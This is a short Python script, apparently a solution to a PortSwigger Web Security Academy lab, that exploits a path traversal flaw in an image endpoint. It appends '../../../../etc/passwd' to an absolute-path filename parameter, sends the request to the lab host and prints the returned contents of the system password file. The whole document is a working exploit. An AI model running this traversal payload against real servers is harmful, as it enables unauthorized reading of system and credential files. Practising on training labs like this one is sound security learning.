#!/usr/bin/python3

import requests

def dt_image(url, api):

    payload = "../../../../etc/passwd"

    r = requests.get(url + api + payload)
    print(r.text)
    
if __name__ == '__main__':
    url = "https://ac111f141f4170b6c0bcc3de00690032.web-security-academy.net"
    api = "/image?filename=/var/www/images/"

    dt_image(url, api)